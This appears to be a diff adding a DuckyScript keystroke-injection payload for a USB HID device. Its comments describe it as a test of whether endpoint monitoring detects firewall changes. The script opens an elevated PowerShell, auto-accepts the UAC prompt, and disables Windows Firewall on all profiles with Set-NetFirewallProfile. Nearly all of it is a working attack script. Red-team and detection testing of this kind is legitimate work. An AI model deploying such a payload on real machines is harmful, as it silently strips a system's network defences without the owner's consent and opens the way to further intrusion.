@@ -1,0 +1,20 @@
+REM ============================================================
+REM  Windows · Disable Firewall (All Profiles)
+REM ============================================================
+REM  Opens elevated PowerShell and disables Windows Firewall
+REM  across all network profiles. For testing whether endpoint
+REM  monitoring catches firewall state changes.
+REM
+REM  Requires admin privileges (UAC prompt).
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+STRINGLN Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+STRINGLN exit
